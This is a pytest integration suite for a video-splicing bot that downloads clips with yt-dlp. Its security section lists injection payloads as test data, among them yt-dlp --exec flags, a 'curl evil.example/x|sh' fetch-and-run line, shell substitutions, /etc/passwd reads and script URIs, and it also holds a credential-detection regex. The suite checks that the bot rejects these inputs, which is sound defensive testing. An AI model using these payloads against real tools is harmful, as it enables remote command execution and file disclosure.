"""End-to-end integration suite.

Unlike the unit tests, most of these drive the whole pipeline with real media
and assert on the finished file. Nothing touches the network: yt-dlp is always
stubbed, and every "download" resolves to a locally generated clip.

    python3 -m pytest tests/test_integration.py -v

Covers, in order:
  1. security       injection, sanitising, rate limiting, secret hygiene
  2. splice maths   short vs long sources, middle-third placement
  3. failures       corrupt media, network faults, missing interruption
  4. output         file exists, duration adds up, temp files gone
"""

import json
import re
import shutil
import subprocess
import sys
import threading
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
import shorts_bot as sb  # noqa: E402
import ui  # noqa: E402

HAVE_FFMPEG = shutil.which("ffmpeg") is not None and shutil.which("ffprobe") is not None


def _source_files():
    """The files the source-scanning tests read.

    Resolved from the imported modules rather than hardcoded as
    "shorts_bot.py", because the script normally carries a version suffix
    ("shorts_bot V1.py") and a hardcoded name silently FileNotFounds.
    """
    return [Path(sb.__file__).resolve(), Path(ui.__file__).resolve()]


def needs_ffmpeg(fn):
    fn = pytest.mark.ffmpeg(fn)
    return pytest.mark.skipif(not HAVE_FFMPEG, reason="ffmpeg not installed")(fn)


# --------------------------------------------------------------------------
# fixtures
# --------------------------------------------------------------------------


def clip(path, seconds, w=360, h=640, fps=30, gop=60, audio=True):
    """A clip shaped like a real YouTube download."""
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    cmd = ["ffmpeg", "-nostdin", "-y", "-v", "error",
           "-f", "lavfi", "-i", f"testsrc=size={w}x{h}:rate={fps}:duration={seconds}"]
    if audio:
        cmd += ["-f", "lavfi", "-i",
                f"sine=frequency=440:duration={seconds},"
                f"aformat=channel_layouts=stereo"]
    cmd += ["-c:v", "libx264", "-preset", "ultrafast", "-g", str(gop),
            "-pix_fmt", "yuv420p"]
    if audio:
        cmd += ["-c:a", "aac", "-ar", "44100", "-ac", "2", "-shortest"]
    cmd += [str(path)]
    subprocess.run(cmd, check=True, capture_output=True)
    return path


@pytest.fixture
def bot(tmp_path):
    """A ready-to-run data folder."""
    root = tmp_path / "shorts_bot_data"
    (root / "inbox").mkdir(parents=True)
    (root / "downloads").mkdir()
    if HAVE_FFMPEG:
        clip(root / "interruption.mp4", 2, w=320, h=320)
    else:
        (root / "interruption.mp4").write_bytes(b"stub")
    return root


@pytest.fixture(autouse=True)
def no_throttle(request, monkeypatch):
    """The 1.5s politeness gap would make this suite crawl.

    Skipped for tests marked `ratelimit`, which are asserting on the throttle
    itself and must see the real implementation.
    """
    if request.node.get_closest_marker("ratelimit"):
        return
    monkeypatch.setattr(sb, "MIN_DOWNLOAD_GAP", 0.0)
    monkeypatch.setattr(sb, "throttle_downloads", lambda *a, **k: None)


class StubYtDlp:
    """Serves a local file for any URL. Optionally misbehaves."""

    def __init__(self, dest, sources=None, raises=None, delay=0.0):
        self.dest = Path(dest)
        self.sources = sources or {}
        self.raises = raises or {}
        self.delay = delay
        self.calls = []

    def __call__(self, cmd, **kw):
        self.calls.append(list(cmd))
        if cmd[0] != "yt-dlp":
            raise AssertionError(f"stub saw a non-yt-dlp command: {cmd[0]}")
        vid = str(cmd[-1]).rstrip("/").rsplit("/", 1)[-1]
        if self.delay:
            time.sleep(self.delay)
        if vid in self.raises:
            raise self.raises[vid]
        if "--print" in cmd:
            return vid + "\n"
        src = self.sources.get(vid)
        if src:
            shutil.copy2(src, self.dest / f"{vid}.mp4")
        return ""


def wire(monkeypatch, stub):
    """Route yt-dlp to the stub, leave ffmpeg and ffprobe real."""
    real = sb.run

    def router(cmd, **kw):
        return stub(cmd, **kw) if str(cmd[0]) == "yt-dlp" else real(cmd, **kw)

    monkeypatch.setattr(sb, "run", router)
    monkeypatch.setattr(sb, "have", lambda b: True)
    return stub


# ==========================================================================
# 1. security
# ==========================================================================


class TestSecurity:

    INJECTIONS = [
        "--exec=touch /tmp/shortsbot_pwned",
        "--exec-before-download=curl evil.example/x|sh",
        "-o/tmp/anywhere.mp4",
        "--config-location=/tmp/evil.conf",
        "--paths=/etc",
        "; touch /tmp/shortsbot_pwned",
        "$(touch /tmp/shortsbot_pwned)",
        "`touch /tmp/shortsbot_pwned`",
        "file:///etc/passwd",
        "../../etc/passwd",
        "javascript:alert(1)",
        "data:text/html,<script>",
    ]

    @pytest.mark.parametrize("payload", INJECTIONS)
    def test_injection_payloads_are_rejected(self, payload):
        assert sb.is_safe_url(payload) is False, f"accepted {payload!r}"

    @pytest.mark.parametrize("good", [
        "https://www.youtube.com/shorts/dQw4w9WgXcQ",
        "http://example.com/v.mp4",
        "HTTPS://EXAMPLE.COM/V",
    ])
    def test_real_urls_are_accepted(self, good):
        assert sb.is_safe_url(good) is True

    @pytest.mark.parametrize("junk", [None, 123, b"https://x", "", "   ", "\n"])
    def test_non_strings_and_blanks_rejected(self, junk):
        assert sb.is_safe_url(junk) is False

    def test_urls_file_flag_injection_never_reaches_yt_dlp(self, bot, monkeypatch):
        """Regression: a line in urls.txt used to become a yt-dlp flag.

        yt-dlp's --exec runs a shell command, so this was remote code
        execution by way of a text file.
        """
        (bot / "urls.txt").write_text(
            "--exec=touch /tmp/shortsbot_pwned\n"
            "https://www.youtube.com/shorts/aaaaaaaaaaa\n")
        stub = wire(monkeypatch, StubYtDlp(bot / "downloads"))
        monkeypatch.setattr(sb, "warn", lambda m: None)
        sb.process_all(bot)

        for call in stub.calls:
            for arg in call:
                assert not str(arg).startswith("--exec"), f"flag leaked: {call}"
        assert not Path("/tmp/shortsbot_pwned").exists()

    def test_pasted_injection_is_dropped(self, bot, monkeypatch):
        stub = wire(monkeypatch, StubYtDlp(bot / "downloads"))
        monkeypatch.setattr(sb, "warn", lambda m: None)
        sb.process_all(bot, extra_urls=["--exec=touch /tmp/x"], force=True)
        assert stub.calls == [], "an injection payload was handed to yt-dlp"

    def test_end_of_options_marker_present(self, bot, monkeypatch):
        """Belt and braces: even a valid URL is passed after `--`."""
        stub = wire(monkeypatch, StubYtDlp(bot / "downloads"))
        try:
            sb.download("https://www.youtube.com/shorts/bbbbbbbbbbb",
                        bot / "downloads")
        except RuntimeError:
            pass
        assert stub.calls
        for call in stub.calls:
            assert "--" in call, f"no end-of-options marker: {call}"
            assert call.index("--") == len(call) - 2

    def test_download_rejects_a_bad_url_directly(self, bot):
        with pytest.raises(RuntimeError, match="http"):
            sb.download("--exec=whoami", bot / "downloads")

    def test_no_shell_is_ever_spawned(self):
        """Parse the code rather than grep it.

        A text search matches comments and docstrings that merely mention
        os.system, which is a false positive. Only real call sites count.
        """
        import ast
        banned = {"system", "popen", "spawnl", "spawnlp"}
        for path in _source_files():
            name = path.name
            tree = ast.parse(path.read_text())
            for node in ast.walk(tree):
                if not isinstance(node, ast.Call):
                    continue
                fn = node.func
                if isinstance(fn, ast.Attribute):
                    owner = getattr(fn.value, "id", "")
                    assert not (owner == "os" and fn.attr in banned), \
                        f"{name} calls os.{fn.attr}()"
                for kw in node.keywords:
                    if kw.arg == "shell":
                        assert not (isinstance(kw.value, ast.Constant)
                                    and kw.value.value is True), \
                            f"{name} passes shell=True"

    def test_no_hardcoded_secrets(self):
        pattern = re.compile(
            r"""(api[_-]?key|secret|passwd|password|access[_-]?token|
                 bearer\s+[a-z0-9]|AKIA[0-9A-Z]{16}|
                 -----BEGIN[ A-Z]*PRIVATE\ KEY)""",
            re.IGNORECASE | re.VERBOSE)
        for path in _source_files():
            name = path.name
            for i, line in enumerate(path.read_text().splitlines(), 1):
                if pattern.search(line) and "=" in line and '"' in line:
                    assert "password" not in line.lower() or "echo" in line, \
                        f"{name}:{i} looks like an embedded credential"

    def test_output_filenames_cannot_escape_the_folder(self, tmp_path):
        out = tmp_path / "output"
        for nasty in ("../../etc/passwd", "a/b/c", "..", "/absolute/path",
                      "with space", "sem;colon", "$(whoami)"):
            p = sb.reserve_output_path(out, sb.slugify(nasty))
            assert p.parent.resolve() == out.resolve(), f"escaped with {nasty!r}"

    def test_inbox_paths_are_absolute_so_they_cannot_look_like_flags(
            self, bot, monkeypatch):
        (bot / "inbox" / "-loglevel.mp4").write_bytes(b"")
        seen = []

        def spy(cmd, **kw):
            seen.append([str(c) for c in cmd])
            raise RuntimeError("halt")

        monkeypatch.setattr(sb, "run", spy)
        monkeypatch.setattr(sb, "error", lambda m, exc=None: None)
        sb.process_all(bot)
        for call in seen:
            for arg in call[1:]:
                if arg.endswith("-loglevel.mp4"):
                    assert arg.startswith("/"), f"relative dash-path: {arg}"

    @pytest.mark.ratelimit
    def test_rate_limiter_enforces_a_gap(self, monkeypatch):
        monkeypatch.setattr(sb, "_last_download", 0.0)
        t0 = time.monotonic()
        sb.throttle_downloads(gap=0.25)
        sb.throttle_downloads(gap=0.25)
        sb.throttle_downloads(gap=0.25)
        elapsed = time.monotonic() - t0
        assert elapsed >= 0.4, f"no throttling applied ({elapsed:.2f}s)"

    @pytest.mark.ratelimit
    def test_rate_limiter_is_thread_safe(self, monkeypatch):
        monkeypatch.setattr(sb, "_last_download", 0.0)
        stamps = []

        def worker():
            sb.throttle_downloads(gap=0.1)
            stamps.append(time.monotonic())

        threads = [threading.Thread(target=worker) for _ in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        stamps.sort()
        gaps = [b - a for a, b in zip(stamps, stamps[1:])]
        assert all(g >= 0.05 for g in gaps), f"gaps collapsed: {gaps}"

    def test_backoff_is_the_reactive_half_of_rate_limiting(self, tmp_path):
        s = sb.State(tmp_path / "state.json")
        s.record_failure("k", "HTTP Error 429")
        assert s.retry_wait("k") > 0

    def test_log_file_is_not_world_writable(self, tmp_path, monkeypatch):
        monkeypatch.setattr(sb, "_log_configured", False)
        keep = list(sb._logger.handlers)
        for h in keep:
            sb._logger.removeHandler(h)
        try:
            path = sb.setup_logging(tmp_path)
            assert path is not None
            sb.log("hello")
            mode = path.stat().st_mode & 0o777
            assert not mode & 0o002, f"log is world-writable ({oct(mode)})"
        finally:
            for h in list(sb._logger.handlers):
                sb._logger.removeHandler(h)
            for h in keep:
                sb._logger.addHandler(h)


# ==========================================================================
# 2. splice maths: short vs long
# ==========================================================================


class TestSpliceMaths:

    @pytest.mark.parametrize("total", [1.0, 2.5, 8.0, 30.0, 60.0, 180.0, 3600.0])
    def test_split_fraction_always_inside_the_configured_range(self, total):
        # Bounds come from SPLIT_RANGE, not hardcoded numbers, so retuning
        # where the cut lands does not silently break this test.
        lo, hi = sb.SPLIT_RANGE
        for _ in range(200):
            frac = sb.pick_split()
            cut = total * frac
            assert total * lo <= cut <= total * hi

    @pytest.mark.parametrize("total,gap", [(10.0, 1.0), (60.0, 2.0), (600.0, 10.0)])
    def test_keyframe_snap_stays_inside_the_configured_range(self, total, gap):
        lo, hi = sb.SPLIT_RANGE
        kfs = [round(i * gap, 3) for i in range(int(total / gap) + 1)]
        for _ in range(100):
            cut, exact = sb.choose_cut(total, kfs)
            assert exact
            assert total * lo <= cut <= total * hi, \
                f"cut {cut} outside {lo:.0%}-{hi:.0%} of {total}"

    def test_snap_falls_back_when_no_keyframe_sits_in_range(self):
        """A long video with one keyframe at the start only."""
        lo, hi = sb.SPLIT_RANGE
        cut, exact = sb.choose_cut(120.0, [0.0])
        assert 120.0 * lo <= cut <= 120.0 * hi

    def test_snap_prefers_the_nearest_keyframe(self):
        kfs = [0.0, 4.0, 5.0, 6.0, 10.0]
        cut, exact = sb.choose_cut(10.0, kfs, split_at=0.51)
        assert cut == 5.0

    def test_no_keyframes_means_no_copy_path(self):
        lo, hi = sb.SPLIT_RANGE
        cut, exact = sb.choose_cut(20.0, [])
        assert exact is False
        assert 20.0 * lo <= cut <= 20.0 * hi

    @needs_ffmpeg
    @pytest.mark.parametrize("seconds", [3, 45])
    def test_short_and_long_sources_both_splice(self, bot, seconds):
        src = clip(bot / "inbox" / f"v{seconds}.mp4", seconds)
        assert sb.process_all(bot) == 1
        out = next((bot / "output").glob("*.mp4"))
        expected = seconds + sb.duration_of(bot / "interruption.mp4")
        assert abs(sb.duration_of(out) - expected) < 0.6

    @needs_ffmpeg
    def test_interruption_lands_where_split_range_says(self, bot):
        """Measured on the finished file, not inferred from the maths."""
        src = clip(bot / "inbox" / "long.mp4", 30)
        sb.process_all(bot)
        out = next((bot / "output").glob("*.mp4"))
        total = sb.duration_of(out)
        mid_len = sb.duration_of(bot / "interruption.mp4")
        source_len = total - mid_len

        found = None
        for t in [x * 0.5 for x in range(0, int(total * 2))]:
            if _is_interruption_frame(out, t):
                found = t
                break
        assert found is not None, "interruption not visible in the output"
        # 0.04 of slack either side: `found` is located by half-second probes
        # and the cut is snapped to a keyframe, so it lands near, not on, the
        # requested fraction.
        lo, hi = sb.SPLIT_RANGE
        assert source_len * (lo - 0.04) <= found <= source_len * (hi + 0.04), \
            f"interruption began at {found}s of a {source_len}s source"

    @needs_ffmpeg
    def test_a_source_too_short_to_split_is_refused(self, bot):
        clip(bot / "inbox" / "tiny.mp4", 0.5)
        assert sb.process_all(bot) == 0
        assert list((bot / "output").glob("*.mp4")) == []


def _is_interruption_frame(video, at):
    """True if the frame at `at` is the interruption clip.

    The interruption is square, so scaling it into a 9:16 frame leaves black
    bars top and bottom; the test source fills the frame edge to edge. So
    sample the top 6% of the frame only. Averaging the WHOLE frame does not
    work: the bars wash out against the picture and every frame looks alike.
    """
    raw = subprocess.run(
        ["ffmpeg", "-nostdin", "-v", "error", "-ss", str(at), "-i", str(video),
         "-frames:v", "1", "-f", "rawvideo", "-pix_fmt", "rgb24",
         "-vf", "crop=iw:ih*0.06:0:0,scale=1:1", "-"],
        capture_output=True).stdout
    return len(raw) >= 3 and max(raw[:3]) < 20


# ==========================================================================
# 3. failure simulation
# ==========================================================================


class TestFailureSimulation:

    @needs_ffmpeg
    def test_corrupted_media_file(self, bot):
        (bot / "inbox" / "broken.mp4").write_bytes(b"\x00\x01\x02" * 400)
        assert sb.process_all(bot) == 0
        assert list((bot / "output").glob("*.mp4")) == []
        assert (bot / "inbox" / "broken.mp4").exists(), \
            "an unprocessable file must stay put, not vanish into processed/"

    @needs_ffmpeg
    def test_truncated_media_file(self, bot):
        good = clip(bot / "inbox" / "half.mp4", 8)
        data = good.read_bytes()
        good.write_bytes(data[:len(data) // 3])
        sb.process_all(bot)
        outs = list((bot / "output").glob("*.mp4"))
        for o in outs:
            assert o.stat().st_size > 0

    @needs_ffmpeg
    def test_empty_file(self, bot):
        (bot / "inbox" / "empty.mp4").write_bytes(b"")
        assert sb.process_all(bot) == 0

    @needs_ffmpeg
    def test_video_with_no_audio_track(self, bot):
        clip(bot / "inbox" / "silent.mp4", 8, audio=False)
        assert sb.process_all(bot) == 1
        out = next((bot / "output").glob("*.mp4"))
        assert sb.has_audio(out), "output must carry an audio track"

    @pytest.mark.parametrize("fault,expect", [
        (RuntimeError("HTTP Error 429: Too Many Requests"), "slower pace"),
        (RuntimeError("[Errno 60] Operation timed out"), "connection dropped"),
        (RuntimeError("Connection reset by peer"), "connection dropped"),
        (RuntimeError("ERROR: Private video"), "public"),
        (RuntimeError("Sign in to confirm you're not a bot"), "bot"),
    ])
    def test_network_faults_are_contained_and_explained(
            self, bot, monkeypatch, fault, expect):
        stub = wire(monkeypatch, StubYtDlp(
            bot / "downloads", raises={"aaaaaaaaaaa": fault}))
        monkeypatch.setattr(sb, "error", lambda m, exc=None: None)
        n = sb.process_all(
            bot, extra_urls=["https://www.youtube.com/shorts/aaaaaaaaaaa"])
        assert n == 0
        what, advice = ui.explain(fault)
        assert expect in (what + advice).lower()

    def test_a_network_fault_does_not_mark_the_item_done(self, bot, monkeypatch):
        wire(monkeypatch, StubYtDlp(
            bot / "downloads",
            raises={"aaaaaaaaaaa": RuntimeError("HTTP Error 500")}))
        monkeypatch.setattr(sb, "error", lambda m, exc=None: None)
        url = "https://www.youtube.com/shorts/aaaaaaaaaaa"
        sb.process_all(bot, extra_urls=[url])
        assert sb.State(bot / "state.json").is_done("url:" + url) is False

    @needs_ffmpeg
    def test_one_network_fault_does_not_stop_the_batch(self, bot, monkeypatch):
        good = clip(bot.parent / "good.mp4", 8)
        wire(monkeypatch, StubYtDlp(
            bot / "downloads",
            sources={"aaaaaaaaaaa": good, "ccccccccccc": good},
            raises={"bbbbbbbbbbb": RuntimeError("HTTP Error 429")}))
        monkeypatch.setattr(sb, "error", lambda m, exc=None: None)
        n = sb.process_all(bot, force=True, extra_urls=[
            "https://www.youtube.com/shorts/aaaaaaaaaaa",
            "https://www.youtube.com/shorts/bbbbbbbbbbb",
            "https://www.youtube.com/shorts/ccccccccccc",
        ])
        assert n == 2

    def test_missing_interruption_file(self, tmp_path, monkeypatch):
        root = tmp_path / "data"
        (root / "inbox").mkdir(parents=True)
        monkeypatch.setattr(sb, "_warned_no_interruption", False)
        said = []
        monkeypatch.setattr(sb, "warn", lambda m: said.append(m))
        assert sb.process_all(root) == 0
        assert any("interruption" in m for m in said)

    @needs_ffmpeg
    def test_corrupted_interruption_file(self, bot):
        (bot / "interruption.mp4").write_bytes(b"\x00" * 900)
        clip(bot / "inbox" / "v.mp4", 8)
        assert sb.process_all(bot) == 0
        assert list((bot / "output").glob("*.mp4")) == []

    @needs_ffmpeg
    def test_interruption_with_an_odd_extension_is_found(self, bot):
        (bot / "interruption.mp4").unlink()
        clip(bot / "interruption.mov", 2, w=320, h=320)
        clip(bot / "inbox" / "v.mp4", 8)
        assert sb.process_all(bot) == 1

    def test_read_only_output_folder(self, bot, monkeypatch):
        def denied(*a, **k):
            raise OSError(13, "Permission denied")

        monkeypatch.setattr(sb.os, "open", denied)
        with pytest.raises(RuntimeError, match="cannot write"):
            sb.reserve_output_path(bot / "output", "x")


# ==========================================================================
# 4. output verification
# ==========================================================================


class TestOutputVerification:

    @needs_ffmpeg
    def test_output_exists_and_is_playable(self, bot):
        clip(bot / "inbox" / "v.mp4", 10)
        assert sb.process_all(bot) == 1
        out = next((bot / "output").glob("*.mp4"))
        assert out.exists() and out.stat().st_size > 1000
        assert sb.duration_of(out) > 0
        spec = sb.probe_spec(out)
        assert spec["vcodec"] and spec["acodec"]

    @needs_ffmpeg
    @pytest.mark.parametrize("seconds", [5, 12, 25])
    def test_total_duration_is_source_plus_interruption(self, bot, seconds):
        clip(bot / "inbox" / f"v{seconds}.mp4", seconds)
        sb.process_all(bot)
        out = next((bot / "output").glob("*.mp4"))
        expected = seconds + sb.duration_of(bot / "interruption.mp4")
        actual = sb.duration_of(out)
        assert abs(actual - expected) < 0.6, \
            f"expected ~{expected:.2f}s, got {actual:.2f}s"

    @needs_ffmpeg
    def test_output_has_both_streams_and_no_gaps(self, bot):
        clip(bot / "inbox" / "v.mp4", 12)
        sb.process_all(bot)
        out = next((bot / "output").glob("*.mp4"))
        raw = subprocess.run(
            ["ffprobe", "-v", "error", "-show_entries",
             "stream=codec_type,duration", "-of", "json", str(out)],
            capture_output=True, text=True).stdout
        streams = json.loads(raw)["streams"]
        kinds = {s["codec_type"] for s in streams}
        assert kinds == {"video", "audio"}
        durations = [float(s["duration"]) for s in streams if "duration" in s]
        assert max(durations) - min(durations) < 0.5, \
            f"audio and video drifted apart: {durations}"

    @needs_ffmpeg
    def test_output_decodes_without_errors(self, bot):
        clip(bot / "inbox" / "v.mp4", 10)
        sb.process_all(bot)
        out = next((bot / "output").glob("*.mp4"))
        proc = subprocess.run(
            ["ffmpeg", "-nostdin", "-v", "error", "-i", str(out),
             "-f", "null", "-"], capture_output=True, text=True)
        assert proc.returncode == 0
        assert proc.stderr.strip() == "", f"decoder complained: {proc.stderr}"

    @needs_ffmpeg
    def test_temp_files_removed_after_success(self, bot, monkeypatch):
        made = _spy_tempdirs(monkeypatch)
        clip(bot / "inbox" / "v.mp4", 8)
        sb.process_all(bot)
        assert made and all(not d.exists() for d in made)

    @needs_ffmpeg
    def test_temp_files_removed_after_failure(self, bot, monkeypatch):
        made = _spy_tempdirs(monkeypatch)
        clip(bot / "inbox" / "v.mp4", 8)
        monkeypatch.setattr(sb, "splice", _boom)
        monkeypatch.setattr(sb, "error", lambda m, exc=None: None)
        sb.process_all(bot)
        assert made and all(not d.exists() for d in made)

    @needs_ffmpeg
    def test_no_stray_files_left_in_the_data_folder(self, bot):
        clip(bot / "inbox" / "v.mp4", 8)
        sb.process_all(bot)
        allowed = {"interruption.mp4", "urls.txt", "state.json",
                   "state.json.lock", "shorts_bot.log", ".prepared",
                   "inbox", "downloads", "output", "processed"}
        stray = [p.name for p in bot.iterdir() if p.name not in allowed]
        assert stray == [], f"unexpected leftovers: {stray}"

    @needs_ffmpeg
    def test_failed_job_leaves_no_partial_output(self, bot, monkeypatch):
        clip(bot / "inbox" / "v.mp4", 8)
        monkeypatch.setattr(sb, "splice", _boom)
        monkeypatch.setattr(sb, "error", lambda m, exc=None: None)
        sb.process_all(bot)
        assert list((bot / "output").iterdir()) == []

    @needs_ffmpeg
    def test_processed_file_moves_out_of_inbox(self, bot):
        clip(bot / "inbox" / "v.mp4", 8)
        sb.process_all(bot)
        assert not (bot / "inbox" / "v.mp4").exists()
        assert (bot / "processed" / "v.mp4").exists()

    @needs_ffmpeg
    def test_two_runs_do_not_produce_duplicates(self, bot):
        clip(bot / "inbox" / "v.mp4", 8)
        sb.process_all(bot)
        first = {p.name for p in (bot / "output").iterdir()}
        sb.process_all(bot)
        assert {p.name for p in (bot / "output").iterdir()} == first

    @needs_ffmpeg
    def test_batch_of_three_produces_three_distinct_outputs(self, bot):
        for i in range(3):
            clip(bot / "inbox" / f"v{i}.mp4", 8)
        assert sb.process_all(bot) == 3
        outs = list((bot / "output").glob("*.mp4"))
        assert len(outs) == 3
        assert len({p.name for p in outs}) == 3
        for o in outs:
            assert sb.duration_of(o) > 8

    @needs_ffmpeg
    def test_state_records_every_success(self, bot):
        for i in range(3):
            clip(bot / "inbox" / f"v{i}.mp4", 8)
        sb.process_all(bot)
        done = sb.State(bot / "state.json").data["done"]
        assert len(done) == 3


def _spy_tempdirs(monkeypatch):
    made = []
    real = sb.tempfile.mkdtemp

    def spy(*a, **k):
        d = real(*a, **k)
        made.append(Path(d))
        return d

    monkeypatch.setattr(sb.tempfile, "mkdtemp", spy)
    return made


def _boom(*a, **k):
    raise RuntimeError("simulated splice failure")
